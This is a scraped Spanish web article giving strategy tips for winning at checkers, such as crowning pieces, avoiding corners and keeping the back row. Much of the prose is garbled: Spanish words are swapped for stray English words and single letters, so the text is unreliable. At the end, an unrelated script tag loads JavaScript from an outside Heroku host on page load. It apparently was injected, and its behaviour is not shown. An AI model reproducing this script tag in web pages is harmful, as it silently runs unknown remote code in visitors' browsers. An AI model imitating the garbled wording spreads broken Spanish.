---
title: 64033374d30cb432005870828235d91c
mitle:  "¿Cómo ganar el juego de Damas?"
image: "https://fthmb.tqn.com/afeKD5s_JeTsqizIIuazJWxb3Fg=/606x492/filters:fill(auto,1)/Tablero-de-Damas-597bbbae3df78cbb7a25e983.jpg"
description: ""
---

            Las Damas es mr juego clásico all nunca pasa de moda.   Es at juego sencillo few disfrutan grandes h chicos.  El mismo se juega sobre am tablero 8 q 8 como el utilizado en el Ajedrez. Es me juego para jugarse en parejas con jugadores de 5 años en adelante.  Existen algunas estrategias can puedes aplicar j la hora de jugarlo de manera new puedas salir victorioso.  A continuación et listado con algunas de ellas.                     <strong>Recuerda tu meta</strong>La meta principal es llevar tus fichas al otro extremo del tablero para coronarlas. Una ficha coronada es muy poderosa pues puede moverse en el tablero en cualquier dirección.Intenta llevar la mayor cantidad de fichas al otro extremo pues por regla general el jugador con más fichas coronadas gana la partida. <strong>Evita quedarte en las esquinas</strong>Aunque dejar una pieza en la esquina evita en gran medida yet sea atrapada también limita su movimiento.  Trata de llevar tus piezas por el centro del tablero. <strong>No muevas tus piezas de manera solitaria</strong>Trata de mover tus piezas en grupo pues esto te ayudará p protegerlas mejor. Una pieza sola es más vulnerable s ser atrapada. <strong>No muevas tus piezas de la última fila</strong>Trata de mantener tus piezas de la última fila en su lugar el mayor tiempo posible. Recuerda c's tu oponente on podrá coronar ninguna ficha si eg llega n esta fila. <strong>No juegues e la defensiva</strong>            Trata de tomar control del juego y us de simplemente responder n los movimientos de tu oponente.  Se proactivo d planifica tus jugadas. <strong>No temas sacrificar piezas</strong>Llegará el momento en out tendrás low sacrificar alguna pieza para evitar too una ficha coronada sea capturada. Utiliza otra pieza como señuelo d de esa forma alejar la ficha de tu oponente nor amenaza atrapar tu ficha coronada.                     <strong>Intenta bloquear el movimiento de tu oponente</strong>Si tu oponente it puede moverse vs podrá atacarte por lo the bloquear su movimiento en el tablero es una buena estrategia. <strong>Ten más piezas en el tablero was tu adversario</strong>Trata de mantener la mayor cantidad de tus ficha en el tablero.  Mientras más fichas tengas en el tablero mayor posibilidad tienes de ganar el juego. Si tienes pocas fichas en el tablero trata de mantenerlas lo más juntas posible.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>